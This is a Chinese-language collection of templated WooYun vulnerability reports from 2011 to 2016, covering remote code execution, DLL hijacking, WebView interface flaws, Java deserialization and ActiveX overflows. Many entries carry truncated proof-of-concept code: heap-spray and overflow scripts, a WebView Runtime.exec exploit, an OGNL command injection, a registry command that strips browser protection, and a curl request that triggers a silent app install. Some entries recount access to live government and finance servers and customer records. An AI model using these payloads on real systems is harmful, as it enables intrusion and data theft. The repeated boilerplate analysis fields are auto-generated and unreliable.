**详情**: 某视频网站TV的页面https://example.com/[已脱敏])代码触发后会创建cmd.exe写入vbs脚本，脚本运行后下载http://[IP已脱敏] \putty.exe运行。所以用户可能在不知情的情况下受到了IE可执行漏洞的危害，影响极大有木有

**POC**: 以上

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2015-0141673] 2345看图王存在远程代码执行漏洞（附漏洞POC）
**厂商**: 2345网址导航 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 2345看图王存在DLL劫持，2345PicViewer.exe进程会尝试加载图片同一目录下的QuserEx.dll文件，将图片文件与恶意的QuserEx.dll文件放在同一目录下，即可造成远程代码执行（用各种吸引眼球的标题打包发给受害者，受害者解压后打开就会中招）。

**POC**: 首先下载一个最新版的2345看图王，官网最新下载地址为https://example.com/[已脱敏] <windows.h>BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpReserved ){switch( fdwReason ){case DLL_PROCES

**绕过**: 直接利用

**修复**: 在2345PicViewer.exe进程中调用SetDllDirectory("")，将当前DLL搜寻目录设置为空。
---

---
### [wooyun-2016-0166969] 某市政务平台存在Java反序列化漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.漏洞描述玉林市云政务平台，weblogic服务器存在java反序列化漏洞2.漏洞地址**.**.**.**/oa/index.lp3.漏洞检测以及利用发现云政务平台采用weblogic服务器，即检测是否存在java反序列化漏洞

**POC**: 检测结果，发现存在，管理员权限

**绕过**: 直接利用

**修复**: 还是简单点……删出InvokerTransformer.class
---

---
### [wooyun-2012-08435] IE暴雷0day漏洞（CVE-2012-1889）
**厂商**: 微软 | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: IE暴雷0day漏洞（CVE-2012-1889），XML组件未名内存破坏漏洞。

**POC**: from: https://example.com/[已脱敏] classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id='ooxx'></object><script>var obj = document.getElementById('ooxx').object;var src = unescape("%u0c0c%u0c0c");while (src.len

**绕过**: 直接利用

**修复**: 临时解决方案：https://example.com/[已脱敏]
---

---
### [wooyun-2014-079236] 途牛网app存在一处信任所有证书漏洞
**厂商**: 途牛旅游网 | **年份**: 2014 | **类型**: 非授权访问/认证绕过

**元思考**: 触发信号: 功能测试

**洞察**: 非授权访问/认证绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/认证绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞危害：信任所有证书将会导致中间人攻击，所有通信内容都可以被截获解密。和远程代码执行漏洞并列最严重的安全漏洞行列。

**POC**: mitm

**绕过**: 直接利用

**修复**: 升级使用的某社交平台某社交平台SDK，使用没有漏洞的SDK版本。比如https://example.com/[已脱敏]
---

---
### [wooyun-2012-08698] 多个TOM在线远程代码执行漏洞
**厂商**: TOM在线 | **年份**: 2012 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 使用ParameterInterceptor中的excludeParams白名单参数限制允许使用的字符串,比如"A-z0-9_.'"[]",像\()@需要禁止.
---

---
### [wooyun-2014-061143] 金山某软件远程任意代码执行（有条件）
**厂商**: 某软件厂商 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WPS抢鲜版是国内非常流行的一款办公软件;出现问题的是最新版本的WPS; 其中的WPS演示，当wpp.exe 在试图打开一个错误的ppt 文件时，它会尝试加载一个系统不存在的dll（uofswr.dll）.导致可执行任意代码。wps在国内是非常的办公软件。如果此漏洞大规模利用，危害极大!出错软件版本：既最新版，其它老版本暂未测试;触发方法，在桌面上新建一个1.txt,其中内容可为空也可为任意值;修改1.txt 为 1.ppt 或 1.pptx;然后把1.ppt 和 uofswr.dll (利用dll,这个都会写吧！)放在同一个目录下。只要wpp.exe打开，就成功触发漏洞！经测试，这个利用方法通用win XP ,win 7 ,win 8 ;结合下社工欺骗，则可在互联网广泛传播病毒，也可定向攻击。这个漏洞危害是不是非常严重！！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 要么不加载，要么就弄一个存在的吧（全路径）
---

---
### [wooyun-2015-098445] 某电商平台IE安全控件可在用户态下被绕过
**厂商**: 某电商平台 | **年份**: 2015 | **类型**: 拒绝服务

**元思考**: 触发信号: 功能测试

**洞察**: 拒绝服务防护不足，开发者信任前端输入

**测试流程**:
1. 识别拒绝服务相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上次在WooYun: 某国有银行安全控件可导致远程任意代码执行（新型技术点）中我说了添加信任域站点的危害，可配合工行网银漏洞导致代码执行。这次反其道而行，我发现其实木马可轻易绕过某电商平台的安全控件。非常简单，我发现某电商平台控件只有当“Protected Mode”关闭时，才能防得住键盘钩子。当“Protected Mode”开启时，什么用都没有，但是页面还是允许用户输入密码。所以绕过的原理就是将某电商平台网站从信任域中去掉即可。Internet域的默认设置是开启“Protected Mode”的。这只需要删除一个注册表键值即可，不需要管理员权限。代码如下：reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\alipay.com" /va /f

**POC**: 1、写个键盘记录器。或者从https://example.com/[已脱敏] delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\alipay.com" /va /f4、用IE打开https://example.com/[已脱敏]

**绕过**: 过滤绕过

**修复**: 再次证明了添加信任域站点是有百害而无一利的，所以说不要修改权限，不要添加信任站点。想办法在默认IE权限下实现功能吧。实现不了的话，不如不要控件。顺便请一定允许我捆绑一个与上述漏洞完全无关的问题：你们某电商平台能不能更新一下TLS配置？可参考https://example.com/[已脱敏]
---

---
### [wooyun-2013-027592] 某视频播放器任意代码执行漏洞（附poc）
**厂商**: 某门户网站 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某视频播放器主程序SHPlayer.exe存在dll劫持风险，SHPlayer.exe在启动时会加载quserex.dll和vsfilter.lang，这些dll在本地不存在，如果黑客将上述格式的媒体文件加上上述对应的恶意dll打包放在一起，发给用户。用户打开上述格式文件，就会执行恶意程序，危害较大。

**POC**: 1、随便建个文件夹，再将证明漏洞的quserex.dll与test.mov放在一起，打开test.mov，就会加载quserex.dll，如下图：2、poc下载地址：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 使用LoadLibrary API加载DLL时使用绝对路径
---

---
### [wooyun-2014-066523] 某浏览器远程代码执行漏洞
**厂商**: 某通信设备厂商 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某浏览器是网宿与某通信厂商合作开发的...某通信厂商是通讯公司，所以浏览器的漏洞还是要关注的哈~Webview的接口的远程代码执行漏洞居然存在- -.下载某浏览器https://example.com/[已脱敏]

**POC**: 搜索addJavascriptInterface就拿其中的zteHistory构造一个写文件+弹窗的Exp：<html><head><title>test</title></head><body><script>function execute(testcmd){return zteHistory.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'Webvie

**绕过**: 直接利用

**修复**: :)
---

---
### [wooyun-2016-0179538] 某资讯APP开放端口可导致远程在用户手机打开任意网站url
**厂商**: 某互联网公司 | **年份**: 2016 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 开启一个http server，来监听这个端口。端口号从本身shared_prefs目录下的multi_process_config.xml文件内获得它用的是NanoHTTPD来实现的一个http server，http server收到数据后，进行解析，然后进行处理，一般是返回一个http应答，然后不做别的事情。但是当header满足 GET /xxx?open_url=yyy 形式的时候，程序会执行这些代码监听com.ss.android.action.openurl的receiver，会把 extra拿出来，当成Intent的data，也就是我们传入的URL，然后调起来Activity:这样，就可以远程操控手机打开任意的URL了

**POC**: import httplibip = "**.**.**.**"port = 8192conn = httplib.HTTPConnection(ip,port)conn.request("GET","/detail?open_url=http://**.**.**.**")r1 = conn.getresponse()print r1.status, r1.reasondata = r1.read()print datafile：开头的URL，可用来安装app，或打开本地文件，这里就不描述了

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-061520] hao123网址导航客户端远程代码执行漏洞
**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: hao123网址导航安卓最新版远程代码执行漏洞存在漏洞的接口：hao123_novel

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0204421] 前海联合基金某系统漏洞泄露用户账号密码及个人信息/发现入侵痕迹
**厂商**: 前海联合基金 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 只查了少量信息证明漏洞存在，没有做坏事，不要查我的水表前海联合基金的两台门户系统存在JAVA weblogic反序列化漏洞连上服务器，有好多人来过了看下网络连接，发现lcx启动lcx的脚本好多lcx进程连上数据库客户信息，有姓名、身份证号和开户密码6000客户信息客户信息，有姓名、身份证号、家庭住址、邮箱、手机号6000客户信息看看土豪客户也有跟我一样的屌丝

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 打补丁可以参考：修复weblogic的JAVA反序列化漏洞的多种方法http://**.**.**.**/web/13470
---

---
### [wooyun-2015-097499] 某软件管家可导致中间人攻击执行任意代码（需要用户交互前提）
**厂商**: 某安全厂商 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前提条件：1、攻击者可以监控并修改用户的网络请求（主动型中间人）。2、用户主动打开某软件管家，并下载任意软件。3、下载过程中需要有1次用户操作（这个操作并非忽略警告）。达到效果：1、全程无警告、无UAC、无任何确认操作。2、以管理员权限自动运行任意exe文件。以下详解：我发现某软件管家在下载软件时，第一个请求是：1）https://example.com/[已脱敏]

**POC**: 以下是在本地用Fiddler模拟出中间人攻击的效果：1、在Fiddler加入下面的规则：2、打开某软件管家任意下载一款软件（“下载”、“一键安装”均可）：3、目录设置，我们正常继续：4、继续安装后“正在创建连接”：5、这一步很有意思，因为正常安装的情况下不会中途暂停一次。这说明某软件管家应该是发现了下载的文件有问题。我不知道它是不是做了签名校验，但这不重要，因为它只说“已暂停”，而没有任何警告，我想绝大多数用户这时不会有任何怀疑，大部分人一定点播放键继续。6、继续下载之后，仍没有任何警告：7、然后木马就以管理员权限自动执行了：另外附一个首页下载的例子：所有网络请求，供参考：

**绕过**: 直接利用

**修复**: 是不是你们在“已暂停”之前有过一次校验，用户继续后忘了校验？如果是的话，在发现有问题时应结束下载，并警告用户。如果压根就没签名校验的话，这个一定要有。
---

---
### [wooyun-2015-0144651] 天天基金网Android客户端账户密码本地明文存储及可被远程窃取
**厂商**: 某财经网站 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.账号密码本地明文存储。2.利用webview漏洞远程窃取本地账号密码数据。

**POC**: Android客户端下载地址：http://**.**.**.**/app/apk  : com.eastmoney.android.fund, 53, 4.0.2, 天天基金网apkmd5: 9e317ff54f4b603860ff43a80a3a3cd8证书 :certmd5: 80a7ddcbbd0574f59f1acbfda7b967dfissuer: O=eastmoneysubject: O=eastmoney账户详细明文存储在本地eastmoney.xml文件中：用户姓名、手机号、账户ID、手势密码明文存储：密码明文存储：身份证号、token信息、手机号明文存储：将webview

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0153353] wormhole第二弹来袭:某安全厂商某应用可远程静默安装app
**厂商**: 某安全厂商 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 参数注入

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 影响版本信息3.2.57 Google play版,可被黑客控制3.2.68 官网最新稳定版,只能被360域触发3.4.70 官网最新beta版,只能被360域触发5.0.15 官网最新公测版,可被黑客控制理论上3.2.68之前版本以及公测版本均受到影响,(后面测试蜂窝网的返回的 versioncode 也佐证此点)---漏洞分析NanoHttpd监听38517端口实现的接口如下比较多,接下来分析两个重要的接口 in (远程静默安装 app) openBrowser(远程打开任意网页)in接口接收如下参数会有一个 sign 的验证的,比较简单是将 url 和一个静态 salt md5取 hash 值openBrowser相对要较为复杂一点,对参数进行了 aes 加密,还对访问的域进行了限制.不过因为 aes 的密钥硬编码可以绕过,还域验证用了 endswith 也是可以绕过的参数只接收了一

**POC**: ---部分 poc静默安装:curl -H "http-client-ip: **.**.**.**" -H "remote-addr: **.**.**.**" -e http://**.**.**.**/ **.**.**.**:38517/in?url=http%3A%2f%**.**.**.**%2f151105%2f2056cf106ef74bb62f6cf90942d44893%2fcom.qihoo.freewifi_350.apk&sign=8d893b4713f324f776141a6fd25dae58&logo=1&name=2&ref=3&log=4SERVER INTE

**绕过**: 过滤绕过, 编码绕过

**修复**: 加强输入验证
---

---
### [wooyun-2013-039807] 电脑安全管家远程执行代码
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 电脑安全管家在网络保护的时候，存在一个dllhijack,TSWebShieldInject.dll是一个保护时自动注入的模块.当别的进程被注入后，loadlibrary没处理绝对路径。我只测试了浏览器部分，也可能别的类型也有问题。所以问题可大可小.利用的时候可以构造一个html文件在webdev。我就本地测试了下，win XP + IE 6内核。html文件同目录下放一个ieframe.dll，打开触发另：某互联网公司安全中心的人说ieframe.dll是IE6的问题，那别的厂商浏览器自己安装在IE6环境下咋一点问题都没呢，偏偏装你个管家就被hijack了？每次都poc，分析过程。你给个5k起步我考虑给你完美分析流程，凭点奖品rank浪费我时间就不值钱了？。问题只是顺带发现，所以提交.

**POC**: 某安全浏览器某搜索引擎浏览器某浏览器某互联网公司自己的浏览器

**绕过**: 直接利用

**修复**: 他们才是专家
---

---
### [wooyun-2012-016450] SAP缓冲区溢出执行任意代码漏洞
**厂商**: SAP音乐播放软件 | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: SAP是一个播放器，启动时对HISTORY.PLA的内容未进行验证，导致缓冲区溢出执行任意代码。将文件内容修改为如下内容，触发漏洞。poc如下：0x41, 0x41, 0x41, 0x41, 0x7E, 0x46, 0x41, 0x41,0x41, 0x7E, 0x4B, 0x41, 0x41, 0x41, 0x7E, 0x50,0x41, 0x41, 0x41, 0x7E, 0x55, 0x41, 0x41, 0x41,0x7E, 0x5A, 0x41, 0x41, 0x41, 0x20, 0x7E, 0x35,0x41, 0x41, 0x41, 0x7E, 0x30, 0x41, 0x41, 0x41,0x7E, 0x25, 0x41, 0x41, 0x41, 0x7E, 0x29, 0x41,0x41, 0x41, 0x7E, 0x43, 0x42, 0x41, 0x41, 0x7E

**POC**: 移除文件正常执行将HISTORY.PLA拖入可执行程序目录，运行，弹出calc

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-066790] 某电脑厂商旗下某浏览器代码执行
**厂商**: 某电脑厂商 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 绿茶浏览器是由某电脑厂商（Lenovo）公司开发的一款致力于为用户提供流畅体验的个性化手机浏览器。该浏览器是市面上最小的全功能浏览器，具有视频播放、网站导航、搜索、下载、个人数据管理等功能，大小仅有市面上其他产品的1/10左右，是某品牌手机的默认浏览器。绿茶浏览器([IP已脱敏]627)下载链接(官方)：某电脑厂商乐商店存在安卓webview远程代码执行漏洞存在漏洞的接口：searchBoxJavaBridge_greentea_webkit_jsgreentea

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0160361] 安徽省物价局某管理系统java反序列化执行漏洞管理员权限
**厂商**: 安徽省物价局 | **年份**: 2015 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**:7001/defaultroot/login.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2011-01451] 某电商平台ptpusb.dll远程指令执行漏洞
**厂商**: 某电商平台 | **年份**: 2011 | **类型**: 远程代码执行

**元思考**: 触发信号: 参数注入

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某电商平台（Alipay）是某电商平台站点所提供的电子商务在线支付服务。某电商平台的口令输入控件实现上存在漏洞，远程攻击者可能利用此漏洞控制用户机器。某电商平台的口令输入控件ptpusb.dll中存在远程代码执行漏洞。ptpusb.dll以如下方式引用Remove()函数：InprocServer32:    ptpusb.dllClassID      :     66F50F46-70A0-4A05-BD5E-FBCC0F9641EC[id(0x60030001), helpstring("method Remove")]void Remove([in] int idx);Remove()函数以如下方式处理idx参数：.text:10003D4E ; Remove.text:10003D4E.text:10003D4E sub_10003D4E    proc near       

**POC**: Alipay ActiveX Remote Code Execute Exploit,enjoy it:)by CK(webmaster@leehoosoftware.org)

**绕过**: 直接利用

**修复**: 为ptpusb.dll设置killbit，或删除%system%\aliedit\ptpusb.dll。
---

---
### [wooyun-2011-01996] web迅雷允许执行任意系统命令漏洞
**厂商**: 迅雷 | **年份**: 2011 | **类型**: 远程代码执行

**元思考**: 触发信号: 参数注入

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Web迅雷是一款基于多资源超线程技术的下载工具，它继承了迅雷5的操作方便、高速下载的特点外，同时使用全网页化的操作界面，更符合互联网用户使用习惯，是国内第一款网页上的下载工具。Web迅雷在实现上存在设计漏洞，程序会接收攻击者提供的恶意参数直接执行，远程攻击者可利用此漏洞控制用户受影响系统

**POC**: <html><head><title>迅雷执行任意系统命令</title></head><body>运行迅雷加载项。<script>/***by long*/server = new ActiveXObject("ThunderServer.WebThunder.1");if(server==null){alert("没装迅雷，请安装web迅雷");window.location.href="https://example.com/[已脱敏]";}else{server.OpenDirectory("cmd");alert("要我帮你关机么？");alert("哎呀呀！悲剧啊！你怎么不

**绕过**: 直接利用

**修复**: XunLei------目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：https://example.com/[已脱敏]
---

---
### [wooyun-2013-036046] 某核电厂存在远程代码执行漏洞
**厂商**: 某核电厂 | **年份**: 2013 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-068707] Discuz! 7.2的SQL注射漏洞与代码执行漏洞
**厂商**: Discuz! | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上次发的漏洞拿到奖励之后，看了几天没有收获，就看了一些其他的东西的代码，昨天拿起来再看居然发现了一个有意思的漏洞。在discuz的7.2里有一段代码include/search_sort.inc.php文件里的代码：@include_once DISCUZ_ROOT.'./forumdata/cache/threadsort_'.$selectsortid.'.php';而且这个$selectsortid变量没有做过任何处理，而且最后还进入到了SQL的查询语句里：$query = $db->query("SELECT tid FROM {$tablepre}optionvalue$selectsortid ".($sqlsrch ? 'WHERE '.$sqlsrch : '')."");应当是在开启了主题分类的网站可以进行SQL注射，而文件包含中的截断方法应该可以在部分主机上进行任意代码

**POC**: 开启主题分类办法：1，版块 » 编辑版块 » 主题分类 （开启）2，左侧添加 分类信息类别3，类别详情进行随意修改，保存4，create出optionvale{$sortid}表，一般从3开始，几次就可以猜中。

**绕过**: 截断攻击

**修复**: 把输入转换成数字类型
---

---
### [wooyun-2016-0168529] 某股份有限公司电子商务平台Java反序列化漏洞
**厂商**: 某建筑央企 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某建筑央企电子商务平台Java反序列化漏洞(Weblogic)不如来个高rank吧？洞洞地址：**.**.**.**:8000/logonAction.do

**POC**: (见原文)

**绕过**: 直接利用

**修复**: http://**.**.**.**/publish/main/9/2015/20151229124452251205640/20151229124452251205640_.htmlhttp://**.**.**.**/publish/main/9/2015/2015111914124858071
---

---
### [wooyun-2014-067752] 搜狗手机app远程代码执行
**厂商**: 搜狗 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试版本：2.5.1android版本：4.1.2

**POC**: 测试版本：2.5.1android版本：4.1.2

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-094767] 某电商集团某支付钱包最新版代码执行漏洞（有环境条件限制）
**厂商**: 某电商平台 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某支付钱包android 最新版由于没有过滤android系统自己添加的webview远程代码执行接口，当开启辅助功能后，像talkback、clockback、QueryBack等，系统会添加两个webview远程代码执行接口，如下图。用户注册页面--服务协议页面另外登录后其他使用了webview的页面也都没有过滤这两个接口。这个辅助功能是为那些视力或者听力不健全的用户提供的服务。他们属于社会弱势群体，当被劫持后就可能在用户手机安装木马等

**POC**: poc:https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 可以使用removeJavascriptInterface这个API移除。编译版本如果比较低，比如android 10 ，里边的webvierw没有removeJavascriptInterface这个方法。可以采用反射调用的方式。public void removeUnsafeJSInteface
---

---
### [wooyun-2015-099762] 上海证券交易所IE插件可导致向本地目录写文件
**厂商**: 上海证券交易所 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海证券交易所IE插件可导致向本地目录写文件PkiCom5 IE插件提供的接口可导致恶意攻击者向用户本地目录写文件，其中一个接口更甚，可以控制写的内容，可以覆盖已有文件。

**POC**: https://example.com/[已脱敏] IE插件，然后在远程服务器中的html中调用有问题的接口向用户本地目录写文件。<html>Test Exploit page<object classid='clsid:A42B0EC0-F064-485F-81D4-CE42105E8E42' id='target' ></object><script language='javascript'>//document.write(target.OwriteFile(

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0160366] 湖南非税收入网Java反序列化漏洞（Weblogic）
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 搜到的是**.**.**.**查了一下是http://**.**.**.**/找到之后测试了下，没想到真的成功了

**POC**: 直接getshell了。点到为止，为了一个更安全的网络世界。

**绕过**: 直接利用

**修复**: 这我真不知道。
---

---
### [wooyun-2013-035965] 国家电网系列之六某分站远程代码执行
**厂商**: 某电力央企 | **年份**: 2013 | **类型**: 

**元思考**: 触发信号: 功能测试

**洞察**: 防护不足，开发者信任前端输入

**测试流程**:
1. 识别相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]]{'whoami',''})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2011-01922] 某运营商手机支付密码控件远程溢出漏洞
**厂商**: 某运营商 | **年份**: 2011 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 支付密码控件cmpaySSClient.ocx接口存在溢出漏洞可以执行任意代码，测试代码如下：<object classid='clsid:C15DDF55-9AE3-490A-A6F5-E63020698D5C' id='obj' ></object>var arg;arg=Array(10240);obj.BHBEncodeAmount(arg);

**POC**: 测试文件版本号: [IP已脱敏]在XPSP3和IE6中测试, 使用WinDbg进行调试<object classid='clsid:C15DDF55-9AE3-490A-A6F5-E63020698D5C' id='obj' ></object>var arg;arg="";for (i=0; i<1024*2+8+4; i++) arg+="A";arg += "PPPP";for (i=0; i<1024*8; i++) arg+="C";obj.BHBEncodeAmount(arg);

**绕过**: 直接利用

**修复**: 在使用_strncpy函数时长度参数取值,应该以目标缓冲区的作为字符个数参数,而代码中却以源字符串长度为字符个数参数此为对函数用法理解不正确导致的,有多处使用strncpy函数的地方均存在安全隐患.
---

---
### [wooyun-2013-021185] leapftp缓冲区溢出代码执行漏洞
**厂商**: LeapWare | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于未对服务器地址做有效性验证，当输入恶意地址链接时，导致代码执行漏洞

**POC**: 修改config.xml内容为如下数据：0x3C, 0x6B, 0x65, 0x65, 0x70, 0x61, 0x6C, 0x69,0x76, 0x65, 0x3E, 0x0D, 0x0A, 0x09, 0x3C, 0x63,0x6D, 0x64, 0x20, 0x6E, 0x61, 0x6D, 0x65, 0x3D,0x22, 0x4C, 0x49, 0x53, 0x54, 0x22, 0x20, 0x2F,0x3E, 0x0D, 0x0A, 0x09, 0x3C, 0x63, 0x6D, 0x64,0x20, 0x6E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x4

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0141355] 某智能电视盒子电视盒子遥控器App漏洞可导致被远程控制（需同局域网内）
**厂商**: 某通信设备厂商 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 后台管理

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

